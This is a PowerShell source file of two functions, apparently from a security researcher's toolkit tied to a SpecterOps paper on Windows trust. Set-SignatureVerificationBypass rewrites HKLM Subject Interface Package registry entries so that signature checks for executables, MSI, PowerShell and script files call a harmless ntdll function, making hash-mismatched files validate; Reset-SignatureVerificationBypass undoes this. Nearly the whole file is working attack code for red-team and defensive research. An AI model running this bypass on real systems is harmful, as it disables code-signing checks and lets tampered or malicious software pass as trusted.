function Set-SignatureVerificationBypass {
<#
.SYNOPSIS

Bypasses digital signature verification checking.

.DESCRIPTION

Set-SignatureVerificationBypass hijacks the CryptSIPDllVerifyIndirectData functionality of the subject interface package specified via the -SignableFormat parameter.

The hijack will be performed for both the native CryptSIPDllVerifyIndirectData functionality but also the WoW64 functionality, when relevant. This is a necessary step since the CryptSIPDllVerifyIndirectData function that is called depends on the architecture of the process performing the verification.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause

.PARAMETER SignableFormat

Specifies the signable format to perform the hijack against.

.EXAMPLE

Set-SignatureVerificationBypass -SignableFormat PortableExecutable

Description
-----------
Performs the signature verification bypass on the portable executable subject interface package. Upon starting a new process that performs signature verification, any PE file that would otherwise fail to validate due to a hash mismatch will now validate.

.OUTPUTS

SIP.HijackResult

Output an object consisting of the state prior to and after the signature verification hijack.

.LINK

https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf
#>

    param (
        [Parameter(Mandatory = $True)]
        [ValidateSet('Cabinet','Catalog','PortableExecutable','WSHJScript','WSHVBScript','WSHWindowsScriptFile','MSI','PowerShell')]
        [String]
        $SignableFormat
    )

    $IsRunningElevated = (New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    if (-not $IsRunningElevated) { throw 'Set-SignatureVerificationBypass must run from an elevated PowerShell prompt.' }

    $HijackFuncName = 'DbgUiContinue'
    $HijackDllPath = Get-Item -Path "$Env:SystemRoot\System32\ntdll.dll" -ErrorAction Stop | Select-Object -ExpandProperty FullName

    $SIPMapping = @{
        Cabinet =              '{C689AABA-8E78-11d0-8C47-00C04FC295EE}'
        Catalog =              '{DE351A43-8E59-11d0-8C47-00C04FC295EE}'
        PortableExecutable =   '{C689AAB8-8E78-11D0-8C47-00C04FC295EE}'
        WSHJScript =           '{06C9E010-38CE-11D4-A2A3-00104BD35090}'
        WSHVBScript =          '{1629F04E-2799-4DB5-8FE5-ACE10F17EBAB}'
        WSHWindowsScriptFile = '{1A610570-38CE-11D4-A2A3-00104BD35090}'
        MSI =                  '{000C10F1-0000-0000-C000-000000000046}'
        PowerShell =           '{603BCC1F-4B59-4E08-B724-D2C6297EF351}'
    }

    $SIPPath = "HKLM:\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\$($SIPMapping[$SignableFormat])"
    $SIPWoW64Path = "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\$($SIPMapping[$SignableFormat])"

    $SIPValues = Get-ItemProperty -Path $SIPPath -ErrorAction Stop
    $SIPWoW64Values = Get-ItemProperty -Path $SIPWoW64Path -ErrorAction SilentlyContinue

    $OldDll = $SIPValues.Dll
    $OldFuncName = $SIPValues.FuncName
    $OldWoW64Dll = $null
    $OldWoW64FuncName = $null

    $NewHijackDll = Set-ItemProperty -Path $SIPPath -Name Dll -Value $HijackDllPath -PassThru | Select-Object -ExpandProperty Dll
    $NewHijackFuncName = Set-ItemProperty -Path $SIPPath -Name FuncName -Value $HijackFuncName -PassThru | Select-Object -ExpandProperty FuncName
    $NewHijackWoW64Dll = $null
    $NewHijackWoW64FuncName = $null

    if ($SIPWoW64Values) {
        $OldWoW64Dll = $SIPWoW64Values.Dll
        $OldWoW64FuncName = $SIPWoW64Values.FuncName

        $HijackWoW64DllPath = Get-Item -Path "$Env:SystemRoot\SysWOW64\ntdll.dll" -ErrorAction Stop | Select-Object -ExpandProperty FullName

        $NewHijackWoW64Dll = Set-ItemProperty -Path $SIPWoW64Path -Name Dll -Value $HijackWoW64DllPath -PassThru | Select-Object -ExpandProperty Dll
        $NewHijackWoW64FuncName = Set-ItemProperty -Path $SIPWoW64Path -Name FuncName -Value $HijackFuncName -PassThru | Select-Object -ExpandProperty FuncName
    }

    [PSCustomObject] @{
        PSTypeName = 'SIP.HijackResult'
        HijackedSubjectInterfacePackage = $SignableFormat
        OriginalDll = $OldDll
        OriginalFuncName = $OldFuncName
        OriginalWoW64Dll = $OldWoW64Dll
        OriginalWoW64FuncName = $OldWoW64FuncName
        NewDll = $NewHijackDll
        NewFuncName = $NewHijackFuncName
        NewWoW64Dll = $NewHijackWoW64Dll
        NewWoW64FuncName = $NewHijackWoW64FuncName
    }
}

function Reset-SignatureVerificationBypass {
<#
.SYNOPSIS

Restores the system to its original state after a signature verification hijack attack occurs.

.DESCRIPTION

Reset-SignatureVerificationBypass restores the system to the previous, uncompromised state after a signature verification hijack attack occurs.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause

.PARAMETER SignableFormat

Specifies the signable format to perform the hijack against.

.PARAMETER OriginalDll

Specifies the DLL path to restore.

.PARAMETER OriginalFuncName

Specifies the CryptSIPDllVerifyIndirectData function name to restore.

.PARAMETER OriginalWoW64Dll

Specifies the WoW64 DLL path to restore.

.PARAMETER OriginalWoW64FuncName

Specifies the WoW64 CryptSIPDllVerifyIndirectData function name to restore.

.EXAMPLE

Reset-SignatureVerificationBypass -SignableFormat PortableExecutable

.EXAMPLE

Set-SignatureVerificationBypass -SignableFormat PortableExecutable | Reset-SignatureVerificationBypass

.EXAMPLE

Reset-SignatureVerificationBypass -OriginalDll 'C:\WINDOWS\System32\WINTRUST.DLL' -OriginalFuncName 'CryptSIPVerifyIndirectData' -OriginalWoW64Dll 'C:\WINDOWS\SysWOW64\WINTRUST.DLL' -OriginalWoW64FuncName 'CryptSIPVerifyIndirectData'

.INPUTS

SIP.HijackResult

Accepts output from Set-SignatureVerificationBypass over the pipeline.

.OUTPUTS

SIP.HijackResult

Output an object consisting of the state prior to and after the signature verification hijack restoration.

.LINK

https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf
#>
    param (
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True, ParameterSetName = 'PipelineInput')]
        [Parameter(Mandatory = $True, ParameterSetName = 'NoPipeline')]
        [ValidateSet('Cabinet','Catalog','PortableExecutable','WSHJScript','WSHVBScript','WSHWindowsScriptFile','MSI','PowerShell')]
        [Alias('HijackedSubjectInterfacePackage')]
        [String]
        $SignableFormat,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True, ParameterSetName = 'PipelineInput')]
        [ValidateNotNullOrEmpty()]
        [String]
        $OriginalDll,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True, ParameterSetName = 'PipelineInput')]
        [ValidateNotNullOrEmpty()]
        [String]
        $OriginalFuncName,

        [Parameter(ValueFromPipelineByPropertyName = $True, ParameterSetName = 'PipelineInput')]
        [String]
        $OriginalWoW64Dll,

        [Parameter(ValueFromPipelineByPropertyName = $True, ParameterSetName = 'PipelineInput')]
        [String]
        $OriginalWoW64FuncName
    )

    $IsRunningElevated = (New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    if (-not $IsRunningElevated) { throw 'Reset-SignatureVerificationBypass must run from an elevated PowerShell prompt.' }

    $SIPMapping = @{
        Cabinet =              '{C689AABA-8E78-11d0-8C47-00C04FC295EE}'
        Catalog =              '{DE351A43-8E59-11d0-8C47-00C04FC295EE}'
        PortableExecutable =   '{C689AAB8-8E78-11D0-8C47-00C04FC295EE}'
        WSHJScript =           '{06C9E010-38CE-11D4-A2A3-00104BD35090}'
        WSHVBScript =          '{1629F04E-2799-4DB5-8FE5-ACE10F17EBAB}'
        WSHWindowsScriptFile = '{1A610570-38CE-11D4-A2A3-00104BD35090}'
        MSI =                  '{000C10F1-0000-0000-C000-000000000046}'
        PowerShell =           '{603BCC1F-4B59-4E08-B724-D2C6297EF351}'
    }

    $System32Path = "$Env:SystemRoot\System32"
    $SysWoW64Path = "$Env:SystemRoot\SysWOW64"

    $DllToRestore = $null
    $FuncNameToRestore = $null
    $WoW64DllToRestore = $null
    $WoW64FuncNameToRestore = $null

    switch ($PSCmdlet.ParameterSetName) {
        'NoPipeline' {
            switch ($SignableFormat) {
                'Cabinet' {
                    $DllToRestore = "$System32Path\WINTRUST.DLL"
                    $FuncNameToRestore = 'CryptSIPVerifyIndirectData'
                    $WoW64DllToRestore = "$SysWoW64Path\WINTRUST.DLL"
                    $WoW64FuncNameToRestore = 'CryptSIPVerifyIndirectData'
                }

                'Catalog' {
                    $DllToRestore = "$System32Path\WINTRUST.DLL"
                    $FuncNameToRestore = 'CryptSIPVerifyIndirectData'
                    $WoW64DllToRestore = "$SysWoW64Path\WINTRUST.DLL"
                    $WoW64FuncNameToRestore = 'CryptSIPVerifyIndirectData'
                }

                'PortableExecutable' {
                    $DllToRestore = "$System32Path\WINTRUST.DLL"
                    $FuncNameToRestore = 'CryptSIPVerifyIndirectData'
                    $WoW64DllToRestore = "$SysWoW64Path\WINTRUST.DLL"
                    $WoW64FuncNameToRestore = 'CryptSIPVerifyIndirectData'
                }

                'WSHJScript' {
                    $DllToRestore = "$System32Path\wshext.dll"
                    $FuncNameToRestore = 'VerifyIndirectData'
                    $WoW64DllToRestore = "$SysWoW64Path\wshext.dll"
                    $WoW64FuncNameToRestore = 'VerifyIndirectData'
                }

                'WSHVBScript' {
                    $DllToRestore = "$System32Path\wshext.dll"
                    $FuncNameToRestore = 'VerifyIndirectData'
                    $WoW64DllToRestore = "$SysWoW64Path\wshext.dll"
                    $WoW64FuncNameToRestore = 'VerifyIndirectData'
                }

                'WSHWindowsScriptFile' {
                    $DllToRestore = "$System32Path\wshext.dll"
                    $FuncNameToRestore = 'VerifyIndirectData'
                    $WoW64DllToRestore = "$SysWoW64Path\wshext.dll"
                    $WoW64FuncNameToRestore = 'VerifyIndirectData'
                }

                'MSI' {
                    $DllToRestore = "$System32Path\MSISIP.DLL"
                    $FuncNameToRestore = 'MsiSIPVerifyIndirectData'
                    $WoW64DllToRestore = "$SysWoW64Path\MSISIP.DLL"
                    $WoW64FuncNameToRestore = 'MsiSIPVerifyIndirectData'
                }

                'PowerShell' {
                    $DllToRestore = "$System32Path\WindowsPowerShell\v1.0\pwrshsip.dll"
                    $FuncNameToRestore = 'PsVerifyHash'
                    $WoW64DllToRestore = "$SysWoW64Path\WindowsPowerShell\v1.0\pwrshsip.dll"
                    $WoW64FuncNameToRestore = 'PsVerifyHash'
                }

            }
        }

        'PipelineInput' {
            $DllToRestore = $OriginalDll
            $FuncNameToRestore = $OriginalFuncName
            $WoW64DllToRestore = $OriginalWoW64Dll
            $WoW64FuncNameToRestore = $OriginalWoW64FuncName
        }
    }

    $SIPPath = "HKLM:\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\$($SIPMapping[$SignableFormat])"
    $SIPWoW64Path = "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\$($SIPMapping[$SignableFormat])"

    $SIPValues = Get-ItemProperty -Path $SIPPath

    $OldDll = $SIPValues.Dll
    $OldFuncName = $SIPValues.FuncName
    $OldWoW64Dll = $null
    $OldWoW64FuncName = $null

    $RestoredDll = Set-ItemProperty -Path $SIPPath -Name Dll -Value $DllToRestore -PassThru | Select-Object -ExpandProperty Dll
    $RestoredFuncName = Set-ItemProperty -Path $SIPPath -Name FuncName -Value $FuncNameToRestore -PassThru | Select-Object -ExpandProperty FuncName
    $RestoredWoW64Dll = $null
    $RestoredWoW64FuncName = $null

    if ($WoW64DllToRestore -and $WoW64FuncNameToRestore) {
        $SIPWoW64Values = Get-ItemProperty -Path $SIPWoW64Path -ErrorAction SilentlyContinue
        $OldWoW64Dll = $SIPWoW64Values.Dll
        $OldWoW64FuncName = $SIPWoW64Values.FuncName

        $RestoredWoW64Dll = Set-ItemProperty -Path $SIPWoW64Path -Name Dll -Value $WoW64DllToRestore -PassThru | Select-Object -ExpandProperty Dll
        $RestoredWoW64FuncName = Set-ItemProperty -Path $SIPWoW64Path -Name FuncName -Value $WoW64FuncNameToRestore -PassThru | Select-Object -ExpandProperty FuncName
    }

    [PSCustomObject] @{
        PSTypeName = 'SIP.HijackResult'
        HijackedSubjectInterfacePackage = $SignableFormat
        OriginalDll = $OldDll
        OriginalFuncName = $OldFuncName
        OriginalWoW64Dll = $OldWoW64Dll
        OriginalWoW64FuncName = $OldWoW64FuncName
        NewDll = $RestoredDll
        NewFuncName = $RestoredFuncName
        NewWoW64Dll = $RestoredWoW64Dll
        NewWoW64FuncName = $RestoredWoW64FuncName
    }
}
